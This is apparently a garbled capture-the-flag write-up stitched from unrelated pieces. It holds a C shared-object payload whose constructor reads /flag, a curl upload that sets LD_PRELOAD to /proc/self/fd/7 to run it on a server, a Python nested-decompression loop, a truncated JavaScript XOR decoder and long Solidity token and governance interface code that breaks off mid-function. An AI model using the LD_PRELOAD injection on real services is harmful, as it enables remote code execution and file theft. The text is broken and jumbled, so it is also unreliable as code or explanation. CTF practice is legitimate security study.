#include 
static void before_main(void) __attribute__((constructor));
static void before_main(void)
{
        FILE *fp = NULL;
        char buff[255];
        fp = fopen("/flag", "r");
        fscanf(fp, "%s", buff);
        write(1, buff, strlen(buff));
}
gcc -s -shared -fPIC rabbit.c -o rabbit.so
curl -v -F data=@rabbit.so -F "LD_PRELOAD=/proc/self/fd/7" 
 --proxy ""
import bz2
import lzma
import gzip
import zstandard as zstd
import py7zr
while 1:
    with open('flag', 'rb') as f:
        header_bytes = f.read(4)
    if header_bytes == b'BZh9':
        # decompress the flag
        with bz2.open('flag', 'rb') as f:
            flag_bytes = f.read()
        with open('flag', 'wb') as f:
            f.write(flag_bytes)
    elif header_bytes == b']\\x00\\x00\\x80':
        # decompress the flag lzma
        with lzma.open('flag', 'rb') as f:
            flag_bytes = f.read()
        with open('flag', 'wb') as f:
            f.write(flag_bytes)
Mahjoong
safer-telegram-bot-1
    elif header_bytes == b'\\x1f\\x8b\\x08\\x08':
        # decompress the flag gzip
        with gzip.open('flag', 'rb') as f:
            flag_bytes = f.read()
        with open('flag', 'wb') as f:
            f.write(flag_bytes)
    elif header_bytes == b'\\x28\\xb5\\x2f\\xfd':
        # decompress the flag zstandard
        with zstd.ZstdDecompressor().stream_reader(open('flag','rb')) as f:
            flag_bytes = f.read()
        with open('flag', 'wb') as f:
            f.write(flag_bytes)
    elif header_bytes == b'\\xFD\\x37\\x7A\\x58':
        # decompress the flag xz
        with lzma.open('flag', 'rb') as f:
            flag_bytes = f.read()
        with open('flag', 'wb') as f:
            f.write(flag_bytes)
    else:
        break
if (damanguan.length > 0){
        let a = 
[240,188,218,205,188,154,138,200,207,33,26,246,30,136,124,38,241,178,193,127,163,161,72
,140,187,16,19];
        let b = [177, 255, 142, 139, 199, 227, 202, 163, 186, 76, 91, 152, 65, 185, 15, 
121, 152, 220, 162, 13, 198, 197, 36, 191, 215, 117, 110];
        let c = new Array(27);
        for(var i = 0 ;i 
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
interface IERC3156FlashBorrower {
    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined 
parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * [EIP 
section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}
interface IGovernor is IERC165 {
    enum ProposalState {
        Pending,
        Active,
        Canceled,
        Defeated,
        Succeeded,
        Queued,
        Expired,
        Executed
    }
    /**
     * @dev Emitted when a proposal is created.
     */
    event ProposalCreated(
        uint256 proposalId,
        address proposer,
        address[] targets,
        uint256[] values,
        string[] signatures,
        bytes[] calldatas,
        uint256 startBlock,
        uint256 endBlock,
        string description
    );
    /**
     * @dev Emitted when a proposal is canceled.
     */
    event ProposalCanceled(uint256 proposalId);
    /**
     * @dev Emitted when a proposal is executed.
     */
    event ProposalExecuted(uint256 proposalId);
    /**
     * @dev Emitted when a vote is cast without params.
     *
     * Note: `support` values should be seen as buckets. Their interpretation depends 
on the voting module used.
     */
    event VoteCast(address indexed voter, uint256 proposalId, uint8 support, uint256 
weight, string reason);
    /**
     * @dev Emitted when a vote is cast with params.
     *
     * Note: `support` values should be seen as buckets. Their interpretation depends 
on the voting module used.
     * `params` are additional encoded parameters. Their intepepretation also depends 
on the voting module used.
     */
    event VoteCastWithParams(
        address indexed voter,
        uint256 proposalId,
        uint8 support,
        uint256 weight,
        string reason,
        bytes params
    );
    /**
     * @notice module:core
     * @dev Name of the governor instance (used in building the ERC712 domain 
separator).
     */
    function name() external view virtual returns (string memory);
    /**
     * @notice module:core
     * @dev Version of the governor instance (used in building the ERC712 domain 
separator). Default: "1"
     */
    function version() external view virtual returns (string memory);
    /**
     * @notice module:voting
     * @dev A description of the possible `support` values for {castVote} and the way 
these votes are counted, meant to
     * be consumed by UIs to show correct vote options and interpret the results. The 
string is a URL-encoded sequence of
     * key-value pairs that each describe one aspect, for example 
`support=bravo&quorum=for,abstain`.
     *
     * There are 2 standard keys: `support` and `quorum`.
     *
     * - `support=bravo` refers to the vote options 0 = Against, 1 = For, 2 = Abstain, 
as in `GovernorBravo`.
     * - `quorum=bravo` means that only For votes are counted towards quorum.
     * - `quorum=for,abstain` means that both For and Abstain votes are counted towards 
quorum.
     *
     * If a counting module makes use of encoded `params`, it should  include this 
under a `params` key with a unique
     * name that describes the behavior. For example:
     *
     * - `params=fractional` might refer to a scheme where votes are divided 
fractionally between for/against/abstain.
     * - `params=erc721` might refer to a scheme where specific NFTs are delegated to 
vote.
     *
     * NOTE: The string can be decoded by the standard
     * 
     * JavaScript class.
     */
    // solhint-disable-next-line func-name-mixedcase
    function COUNTING_MODE() external pure virtual returns (string memory);
    /**
     * @notice module:core
     * @dev Hashing function used to (re)build the proposal id from the proposal 
details..
     */
    function hashProposal(